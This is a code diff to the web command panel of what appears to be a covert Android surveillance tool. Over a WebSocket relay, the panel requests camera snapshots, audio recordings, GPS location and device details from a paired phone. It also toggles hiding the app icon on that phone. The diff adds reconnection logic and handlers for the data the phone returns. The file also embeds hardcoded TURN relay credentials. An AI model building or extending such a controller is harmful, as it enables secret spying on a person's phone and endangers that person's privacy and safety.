@@ -47,6 +47,7 @@ body{background:#f0f2f5;font-family:'Segoe UI',system-ui,sans-serif;display:flex
 #status{padding:4px 14px;border-radius:20px;background:#dbeafe;color:#1d4ed8;font-size:12px;font-weight:600;letter-spacing:.3px}
 #status.offline{background:#fee2e2;color:#b91c1c}
 #status.ok{background:#dcfce7;color:#15803d}
+#status.connecting{background:#fef9c3;color:#854d0e}
 .reconnect-btn{background:#f1f5f9;color:#64748b;border:1px solid #e2e8f0;border-radius:20px;padding:4px 14px;font-size:12px;cursor:pointer;transition:.13s}
 .reconnect-btn:hover{background:#2563eb;color:white;border-color:#2563eb}
 #content{flex:1;padding:16px;overflow:auto}
@@ -219,6 +220,12 @@ audio{width:100%;margin-top:12px;border-radius:8px}
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 const WS_URL = "wss://mirror-view.onrender.com";
+console.log('[CONFIG] WS relay:', WS_URL);
+// ── Connection diagnostic: log WS state every 10s ────────────────────────────
+setInterval(()=>{
+  const state=['CONNECTING','OPEN','CLOSING','CLOSED'];
+  console.log('[WS] state:', ws ? state[ws.readyState]||ws.readyState : 'null (no socket)');
+}, 10000);
 const ICE = [
   {urls:"stun:stun.relay.metered.ca:80"},
   {urls:"turn:standard.relay.metered.ca:80",username:"dc05b4f4ae8aaae1fff19747",credential:"OrIiLL1BH86B17iP"},
@@ -480,7 +487,7 @@ function stopLiveAudio(){
 // ── Commands ───────────────────────────────────────────────────────────────────
 function sendCommand(cmd,params){
   params=params||{};
-  if(!ws||ws.readyState!==1){ panel().innerHTML='<div style="color:#f87171">⚠ Not connected.</div>'; return; }
+  if(!ws||ws.readyState!==1){ panel().innerHTML='<div style="color:#f87171;padding:10px">⚠ Not connected to device.<br><button onclick="connectWebSocket()" style="margin-top:6px;padding:4px 14px;background:#2563eb;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">⟲ Reconnect now</button></div>'; return; }
   const rid='req_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
   ws.send(JSON.stringify({type:'COMMAND',command:cmd,requestId:rid,params,timestamp:Date.now()}));
   panel().innerHTML='<div style="color:#94a3b8;padding:10px">📤 Sent: '+cmd+'…</div>';
@@ -591,7 +598,47 @@ function handleJSON(json){
     case 'DEVICE_STATUS': setStatus(json.status); break;
     case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; break;
     case 'APP_SHOWN':  iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; break;
-    case 'HEARTBEAT': break;
+    case 'HEARTBEAT': break;   // Android sends {type:'HEARTBEAT'} every 15s keep-alive
+
+    // ── Android WebSocketConnection.sendCapturedImage() ─────────────────────
+    // Sends: {type:'CAMERA_IMAGE', requestId:'...', data:'base64jpeg'}
+    case 'CAMERA_IMAGE':
+      if(json.data) displayCapturedImage(json.data);
+      else panel().innerHTML='<div style="color:#f87171;padding:10px">❌ Snapshot returned no data.</div>';
+      pendingCmd=null; break;
+
+    // ── Android WebSocketConnection.sendDeviceInfo() ─────────────────────────
+    // Sends: {type:'DEVICE_INFO', manufacturer, model, androidVersion, sdkVersion, batteryLevel, networkType}
+    case 'DEVICE_INFO':
+      (()=>{
+        const mfr=(json.manufacturer||'').trim();
+        const mdl=(json.model||'').trim();
+        const name=mfr&&mdl ? mfr+' '+mdl : (mfr||mdl||'Unknown device');
+        const bat =json.batteryLevel!=null ? ' 🔋'+json.batteryLevel+'%' : '';
+        const net =json.networkType  ? ' 📶'+json.networkType : '';
+        const ver =json.androidVersion ? ' · Android '+json.androidVersion : '';
+        setStatus('ONLINE');
+        panel().innerHTML=`<div style="padding:14px;font-size:13px;line-height:1.7;color:#1e293b">
+          ✅ <b>Device paired</b><br>
+          📱 ${name}${ver}${bat}${net}
+        </div>`;
+        console.log('[WS] DEVICE_INFO:', json);
+      })(); break;
+
+    // ── Android audio recording lifecycle ────────────────────────────────────
+    case 'AUDIO_RECORDING_STARTED':
+      panel().innerHTML='<div style="padding:10px;color:#2563eb">🎙 Recording started…</div>';
+      pendingCmd=null; break;
+    case 'AUDIO_RECORDING_STOPPED':
+      panel().innerHTML='<div style="padding:10px;color:#64748b">🎙 Recording stopped. Waiting for audio…</div>';
+      pendingCmd=null; break;
+
+    // ── Misc response confirmations ──────────────────────────────────────────
+    case 'VIBRATE_COMPLETE':
+      notify('📳 Vibrated'); pendingCmd=null; break;
+    case 'GPS_UPDATES_STOPPED':
+      panel().innerHTML='<div style="padding:10px;color:#64748b">📍 GPS updates stopped.</div>';
+      pendingCmd=null; break;
     default: {
       // Catch-all: try to detect payload type from content
       const d=json.data!=null?json.data:json;
@@ -634,23 +681,60 @@ function handlePlain(msg){
 }
 
 // ── WebSocket ──────────────────────────────────────────────────────────────────
+let _wsRetryTimer = null;
+let _wsRetryDelay = 3000;   // start at 3s, back off to 30s max
+
 function connectWebSocket(){
-  if(ws){ try{ws.close();}catch(e){} ws=null; }
+  if(_wsRetryTimer){ clearTimeout(_wsRetryTimer); _wsRetryTimer=null; }
+  if(ws){ try{ ws.close(); }catch(e){} ws=null; }
   setStatus('CONNECTING');
-  ws=new WebSocket(WS_URL);
-  ws.onopen=()=>{ ws.send('I_AM_WEB'); setStatus('ONLINE'); panel().innerHTML='✅ Connected.'; };
+  panel().innerHTML='<div style="color:#94a3b8;padding:12px">🔄 Connecting to relay…</div>';
+
+  try{ ws=new WebSocket(WS_URL); }
+  catch(e){ _scheduleReconnect('Bad URL: '+e.message); return; }
+
+  ws.onopen=()=>{
+    _wsRetryDelay=3000;          // reset back-off on success
+    ws.send('I_AM_WEB');         // relay server pairs WEB↔DEVICE by this string
+    setStatus('CONNECTED');      // relay connected — waiting for device to pair
+    panel().innerHTML='<div style="color:#2563eb;padding:12px">🔗 Relay connected — waiting for device…</div>';
+    console.log('[WS] opened, sent I_AM_WEB');
+  };
+
   ws.onmessage=e=>{
     const msg=e.data;
+    console.log('[WS] ←', msg.length>200 ? msg.substring(0,200)+'…' : msg);
     try{ handleJSON(JSON.parse(msg)); } catch(_){ handlePlain(msg); }
   };
-  ws.onclose=()=>{ setStatus('OFFLINE'); panel().innerHTML='🔌 Disconnected.'; ws=null; };
-  ws.onerror=()=>setStatus('ERROR');
+
+  ws.onclose=(ev)=>{
+    console.warn('[WS] closed code='+ev.code+' reason='+ev.reason);
+    ws=null;
+    setStatus('OFFLINE');
+    panel().innerHTML='<div style="color:#f87171;padding:12px">🔌 Disconnected (code '+ev.code+'). Reconnecting…</div>';
+    _scheduleReconnect();
+  };
+
+  ws.onerror=(e)=>{
+    console.error('[WS] error', e);
+    setStatus('ERROR');
+    // onclose fires right after onerror, so reconnect is triggered there
+  };
+}
+
+function _scheduleReconnect(reason){
+  if(reason) console.warn('[WS] reconnect reason:', reason);
+  _wsRetryTimer=setTimeout(()=>{ console.log('[WS] reconnecting…'); connectWebSocket(); }, _wsRetryDelay);
+  _wsRetryDelay=Math.min(_wsRetryDelay*1.5, 30000); // exponential back-off, max 30s
 }
 
 // ── UI Helpers ─────────────────────────────────────────────────────────────────
 function setStatus(s){
   const el=statusEl(); el.innerText=s;
-  el.className= s==='ONLINE'?'ok' : (s==='OFFLINE'||s==='ERROR')?'offline' : '';
+  el.className= s==='ONLINE' ? 'ok'
+              : (s==='OFFLINE'||s==='ERROR') ? 'offline'
+              : s==='CONNECTED' ? 'connecting'   // relay up, device not yet paired
+              : '';
 }
 function notify(txt){ const el=statusEl(); const o=el.innerText; el.innerText=txt; setTimeout(()=>el.innerText=o,2500); }
 function toggleCameraPanel(id){
